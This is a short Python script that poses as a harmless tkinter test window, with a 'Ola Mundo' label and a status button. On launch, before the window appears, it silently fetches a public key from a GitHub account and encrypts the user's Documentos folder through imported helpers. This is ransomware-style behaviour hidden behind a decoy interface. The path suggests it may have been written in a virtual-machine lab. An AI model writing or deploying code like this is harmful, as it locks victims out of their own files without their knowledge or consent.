#!/usr/bin/env python3
import os
import tkinter as tk
from tkinter import messagebox

from main import GITHUB_USER, encriptar_pasta, obter_chave_publica_github

pasta = os.path.expanduser("/home/vboxuser/Documentos")
    
chave_pub = obter_chave_publica_github(GITHUB_USER)
    
if chave_pub:
    encriptar_pasta(pasta, chave_pub)

# --- Funções do App ---
def acao_botao():
    messagebox.showinfo("Teste")

def fechar():
    janela.destroy()

# --- Configuração da Janela ---
janela = tk.Tk()
janela.title("Painel de teste")
janela.geometry("400x300")
janela.configure(bg="#f0f0f0") # Uma corzinha cinza claro

# Texto (Label)
texto = tk.Label(janela, text="Ola Mundo", font=("Arial", 16), bg="#f0f0f0")
texto.pack(pady=40)

# Botão (Button)
botao = tk.Button(janela, text="Verificar Status", command=acao_botao, 
                  font=("Arial", 12), bg="#ff69b4", fg="white", padx=20, pady=10)
botao.pack()

# Botão Sair
btn_sair = tk.Button(janela, text="Sair", command=fechar, bg="#cccccc")
btn_sair.pack(side="bottom", pady=20)

# Mantém a janela aberta
janela.mainloop()